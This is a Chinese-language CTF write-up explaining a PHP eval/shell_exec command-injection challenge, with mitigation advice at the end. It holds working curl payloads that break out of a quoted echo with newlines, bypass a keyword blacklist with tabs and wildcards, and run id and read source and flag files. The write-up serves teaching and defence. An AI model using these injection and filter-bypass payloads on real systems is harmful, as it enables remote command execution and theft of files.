---
title: "eval 命令注入"
slug: "ctf-eval-command-injection"
date: 2026-09-13T17:39:02+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "只有一个 GET 参数的 eval 题，从信息收集到命令执行。"
summary: "只有一个 GET 参数的 eval 题，从信息收集到命令执行。"
tags: ["CTF", "命令注入", "RCE"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 18
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/18.eval(命令注入).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-eval-command-injection/workflow.svg" alt="用户输入进入 eval 后，通过函数调用和过滤绕过实现命令执行。" loading="lazy">
  <figcaption>图 1 · eval 命令注入链。用户输入进入 eval 后，通过函数调用和过滤绕过实现命令执行。</figcaption>
</figure>

网址:`http://203.0.113.12:46605/`(Apache/2.4.7 Ubuntu + PHP/5.5.9,只有一个GET参数`secert`)

## 1. 信息收集

- 1.首页是一个"说出你的秘密"表单,method=GET,参数名`secert`(源码里也是这个拼写错误)

```bash
curl.exe -s -i http://203.0.113.12:46605/
```

- 2.`/flag.php`返回200但`Content-Length: 0`-->flag写在源码注释里,不在页面上

```bash
curl.exe -s -i http://203.0.113.12:46605/flag.php
```

- 3.传`hello`回显`你的秘密是aGVsbG8K`-->base64解出来是`hello\n`,末尾多出的换行是`echo`给的
  - -->说明输入被拼进了shell命令,不是纯PHP字符串拼接

## 2. 黑名单测绘

- 4.把各种字符送进`secert`,回显本身就是过滤后的输入,实测出黑名单:
  - `&   ;   |   '   -   $   (   )   `   ||   cat   (空格)   {   ,   ..   /   >   flag`
- 5.三条关键点:
  - (1)`"`没有被过滤,而源码是`echo "$str"`-->可以用`"`提前闭合双引号
  - (2)换行符没有被过滤(`;`/`|`/`&`都被删,但`\n`不在黑名单里)-->可以拿来当命令分隔符
  - (3)过滤后为空会走"少年你的秘密呢？"分支(可以用来判断输入有没有被吃光)

## 3. 命令注入(RCE)

- 6.payload:`secert = " \n id \n "`,服务端实际执行:
  - `echo ""`
  - `id`
  - `"" | base64`
- 7.URL编码后直接打(`%22`=`"`,`%0A`=换行):

```bash
curl.exe -s "http://203.0.113.12:46605/?secert=%22%0Aid%0A%22&submit=x"
```

  - -->回显`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- 学到:注入出去的命令输出是未base64的原始输出(只有`echo "..." | base64`那一段会被编码),这本身就证明注入成功

## 4. 读源码拿flag(关键字绕过)

- 8.黑名单里有`cat`/`flag`/`/`/`-`/空格,所以:
  - (1)用`nl`/`more`/`tail`代替`cat`
  - (2)用tab(`%09`)代替空格做参数分隔
  - (3)用通配符`fla?.php`代替字面量`flag.php`(不含`flag`子串,`?`没被过滤)
- 9.读`index.php`确认黑名单与漏洞行:

```bash
curl.exe -s "http://203.0.113.12:46605/?secert=%22%0Anl%09index.php%0A%22"
```

  - `$blacklist = array('&'=>'',';'=>'','|'=>'',"'"=>'', ... 'flag'=>'')`

```bash
echo "你的秘密是".shell_exec("echo \"$str\" | base64");
```

- 10.读`flag.php`(两条不同命令互为验证):

```bash
curl.exe -s "http://203.0.113.12:46605/?secert=%22%0Amore%09fla%3F.php%0A%22"
curl.exe -s "http://203.0.113.12:46605/?secert=%22%0Atail%09fla%3F.php%0A%22"
```

  - -->`<?php //$flag=flag{03e4f9e5-8c8a-4792-a61d-a45e1cbaaea6}; ?>`

## 5. 对照(失败路径)

- (1)`grep\tflag\tfla?.php`-->命令里的`flag`被过滤掉,无输出
- (2)`secert=flag`-->输入被吃光,页面变成"少年你的秘密呢？"
- (3)直接访问`/flag.php`仍然是0字节-->证明flag只能从源码读

## 6. flag

- `flag{03e4f9e5-8c8a-4792-a61d-a45e1cbaaea6}`

## 7. 成因与修复

- (1)成因:用户输入直接拼进`shell_exec`;黑名单式`str_replace`天然不可能穷尽(漏了`"`、`\n`、`\t`)
- (2)修复:不要用shell拼接;要base64就直接用`base64_encode($str)`;必须调外部命令时用`escapeshellarg()`/`escapeshellcmd()`,并对参数做白名单校验
- (3)`flag.php`放在web可直接访问的目录下、内容还写在注释里,也是额外风险点
